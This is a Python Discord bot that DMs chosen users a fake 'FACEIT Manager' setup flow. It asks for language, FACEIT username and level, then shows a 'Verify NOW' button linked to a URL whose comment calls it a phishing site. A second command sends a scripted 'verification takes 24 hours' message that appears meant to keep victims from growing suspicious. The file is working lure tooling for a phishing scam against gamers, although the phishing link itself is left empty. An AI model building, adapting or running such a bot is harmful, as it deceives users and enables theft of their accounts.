import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os

# ─────────────────────────────────────────
#  НАЛАШТУВАННЯ
# ─────────────────────────────────────────
TOKEN = "123123123"   # <-- вставте свій токен

GUILD_ID = 123123123123

VERIFY_URL = ""   # фишинг сайт
# ^^^ Для МИТТЄВОЇ синхронізації вставте ID вашого сервера:
#     GUILD_ID = 123456789012345678
# Як знайти ID: ПКМ на сервері → "Скопіювати ID" (потрібен Developer Mode у налаштуваннях Discord)
# Якщо залишити None — команди з'являться глобально, але це може зайняти до 1 години

# ─────────────────────────────────────────
#  FACEIT рівні → Elo діапазони
# ─────────────────────────────────────────
LEVEL_ELO = {
    1: "1 – 800",
    2: "801 – 950",
    3: "951 – 1100",
    4: "1101 – 1250",
    5: "1251 – 1400",
    6: "1401 – 1550",
    7: "1551 – 1700",
    8: "1701 – 1850",
    9: "1851 – 2000",
    10: "2000+",
}

LANGUAGES = ["🇬🇧 English", "🇷🇺 Russian", "🇩🇪 German",
             "🇫🇷 French", "🇵🇱 Polish", "🇺🇦 Ukrainian"]

# ─────────────────────────────────────────
#  Зберігання стану сесій (у пам'яті)
# ─────────────────────────────────────────
sessions: dict[int, dict] = {}

# ─────────────────────────────────────────
#  Інтент і бот
# ─────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ═══════════════════════════════════════════════════════════════
#  UI  –  View: вибір мови (крок 1)
# ═══════════════════════════════════════════════════════════════
class LanguageSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label=lang, value=lang)
            for lang in LANGUAGES
        ]
        super().__init__(placeholder="Select your language...", options=options, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        uid = interaction.user.id
        sessions[uid]["language"] = self.values[0]
        sessions[uid]["step"] = 2

        await interaction.response.edit_message(
            embed=make_step2_embed(),
            view=UsernameView(),
            attachments=[]
        )


class LanguageView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
        self.add_item(LanguageSelect())


# ═══════════════════════════════════════════════════════════════
#  UI  –  View: введення нікнейму (крок 2)
# ═══════════════════════════════════════════════════════════════
class UsernameModal(discord.ui.Modal, title="Enter FACEIT Username"):
    username = discord.ui.TextInput(
        label="FACEIT Username",
        placeholder="Your FACEIT username...",
        max_length=64,
    )

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id
        sessions[uid]["username"] = self.username.value
        sessions[uid]["step"] = 3

        await interaction.response.edit_message(
            embed=make_step3_embed(self.username.value),
            view=LevelView(),
            attachments=[]
        )


class UsernameView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Enter Username", style=discord.ButtonStyle.primary, emoji="🔎")
    async def enter_username(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(UsernameModal())


# ═══════════════════════════════════════════════════════════════
#  UI  –  View: вибір рівня (крок 3)
# ═══════════════════════════════════════════════════════════════
class LevelButton(discord.ui.Button):
    def __init__(self, level: int):
        super().__init__(
            label=str(level),
            style=discord.ButtonStyle.secondary,
            custom_id=f"level_{level}",
            row=0 if level <= 5 else 1,
        )
        self.level = level

    async def callback(self, interaction: discord.Interaction):
        uid = interaction.user.id
        sessions[uid]["level"] = self.level
        sessions[uid]["step"] = 4

        data = sessions[uid]
        await interaction.response.edit_message(
            embed=make_done_embed(data),
            view=VerifyView(),
            attachments=[]
        )


class LevelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
        for lvl in range(1, 11):
            self.add_item(LevelButton(lvl))



# ═══════════════════════════════════════════════════════════════
#  UI  –  View: кнопка Verify NOW (фінал)
# ═══════════════════════════════════════════════════════════════
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # кнопка не зникає
        self.add_item(discord.ui.Button(
            label="✅  Verify NOW",
            style=discord.ButtonStyle.link,
            url=VERIFY_URL,
            emoji=None,
        ))

# ═══════════════════════════════════════════════════════════════
#  Embeds для кожного кроку
# ═══════════════════════════════════════════════════════════════
ORANGE = discord.Color.from_str("#ff5500")


def make_step1_embed() -> discord.Embed:
    e = discord.Embed(
        title="👋 Welcome to FACEIT Manager!",
        description="**Step 1 of 3 · Language**\n\nPlease select your preferred language.",
        color=ORANGE,
    )
    e.set_image(url="attachment://discord_1.png")
    e.set_footer(text="● ○ ○  Step 1/3")
    return e


def make_step2_embed() -> discord.Embed:
    e = discord.Embed(
        title="🔍 FACEIT Username",
        description="**Step 2 of 3 · Username**\n\nKindly enter your FACEIT username.",
        color=ORANGE,
    )
    e.set_image(url="attachment://discord_2.png")
    e.set_footer(text="○ ● ○  Step 2/3")
    return e


def make_step3_embed(username: str) -> discord.Embed:
    e = discord.Embed(
        title="🎮 FACEIT Level",
        description=(
            f"**Step 3 of 3 · Level**\n\n"
            f"Username saved: **{username}**\n\n"
            "Please specify your FACEIT level.\n"
            "*Every week the top players get a chance to compete for prizes and recognition on the pro scene.*"
        ),
        color=ORANGE,
    )
    e.set_image(url="attachment://discord_3.png")
    e.set_footer(text="○ ○ ●  Step 3/3")
    return e


def make_done_embed(data: dict) -> discord.Embed:
    level = data.get("level", "?")
    elo_range = LEVEL_ELO.get(level, "N/A")
    e = discord.Embed(
        title="✅ Setup Complete!",
        color=discord.Color.green(),
        description=(
            f"Your FACEIT profile has been saved.\n\n"
            f"🌐 **Language:** {data.get('language', 'N/A')}\n"
            f"👤 **Username:** `{data.get('username', 'N/A')}`\n"
            f"🏆 **Level:** {level}  *(Elo {elo_range})*\n\n"
            "*Good luck on your FACEIT journey!*"
        ),
    )
    e.set_footer(text="FACEIT Manager Bot")
    return e


def make_step1_embed_no_image() -> discord.Embed:
    e = discord.Embed(
        title="👋 Welcome to FACEIT Manager!",
        description="**Step 1 of 3 · Language**\n\nPlease select your preferred language.",
        color=ORANGE,
    )
    e.set_footer(text="● ○ ○  Step 1/3")
    return e


# ═══════════════════════════════════════════════════════════════
#  Хелпер: відправити крок 1 у ЛС з картинками
# ═══════════════════════════════════════════════════════════════
async def send_dm_flow(target: discord.Member, sender: discord.Member) -> str:
    try:
        dm = await target.create_dm()
    except discord.Forbidden:
        return f"❌ Cannot open DM with {target.mention} — they may have DMs disabled."

    sessions[target.id] = {"step": 1, "language": None, "username": None, "level": None}

    image_path = os.path.join(os.path.dirname(__file__), "images", "discord_1.png")
    if not os.path.exists(image_path):
        await dm.send(
            embed=make_step1_embed_no_image(),
            view=LanguageView(),
        )
    else:
        file = discord.File(image_path, filename="discord_1.png")
        await dm.send(
            embed=make_step1_embed(),
            view=LanguageView(),
            file=file,
        )

    return f"✅ DM sent to {target.mention}!"


# ═══════════════════════════════════════════════════════════════
#  Slash-команда /dmset
# ═══════════════════════════════════════════════════════════════
@tree.command(name="dmset", description="Send FACEIT setup flow to a user via DM")
@app_commands.describe(user="The user to send the setup to")
@app_commands.checks.has_permissions(manage_guild=True)
async def dmset(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(ephemeral=True)

    if user.bot:
        await interaction.followup.send("❌ You cannot send setup to a bot.", ephemeral=True)
        return

    result = await send_dm_flow(user, interaction.user)
    await interaction.followup.send(result, ephemeral=True)


@dmset.error
async def dmset_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message(
            "❌ You need **Manage Server** permission to use this command.", ephemeral=True
        )
    else:
        await interaction.response.send_message(f"❌ Error: {error}", ephemeral=True)




#  КОМАНДА: /dmpaste
# ═══════════════════════════════════════════════════════════════
@tree.command(name="dmpaste", description="Send a message to a user via DM")
@app_commands.describe(user="The user to send the message to")
@app_commands.checks.has_permissions(manage_guild=True)
async def dmpaste(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(ephemeral=True)

    if user.bot:
        await interaction.followup.send("❌ You cannot send message to a bot.", ephemeral=True)
        return

    try:
        dm = await user.create_dm()
        await dm.send("""⏳✅ Verification usually takes up to 24 hours.
🙏 Please be patient and wait 1 full day for the process to be completed.

⚡️ During this time your request is being reviewed by the system and moderators.
📌 Spamming or trying to verify again will not make it faster.
💡 The best thing you can do is relax and just wait.

📩 Once the verification is finished, you’ll immediately receive a notification.
🎉 After that, you’ll be ready to play without any issues.""")
        await interaction.followup.send(f"✅ Message sent to {user.mention}!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send(f"❌ Cannot send DM to {user.mention} — they may have DMs disabled.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)


@dmpaste.error
async def dmpaste_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message(
            "❌ You need Manage Server permission to use this command.", ephemeral=True
        )
    else:
        await interaction.response.send_message(f"❌ Error: {error}", ephemeral=True)

# ═══════════════════════════════════════════════════════════════
#  Events
# ═══════════════════════════════════════════════════════════════
@bot.event
async def on_ready():
    try:
        if GUILD_ID:
            guild = discord.Object(id=GUILD_ID)
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            print(f"✅ Synced {len(synced)} command(s) to guild {GUILD_ID} (instant)")
        else:
            synced = await bot.tree.sync()
            print(f"✅ Synced {len(synced)} command(s) globally (up to 1 hour delay)")
    except Exception as e:
        print(f"❌ Sync error: {e}")

    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print("─────────────────────────────")
    print("Commands: /dmset @user")


# ═══════════════════════════════════════════════════════════════
#  Run
# ═══════════════════════════════════════════════════════════════
bot.run(TOKEN)
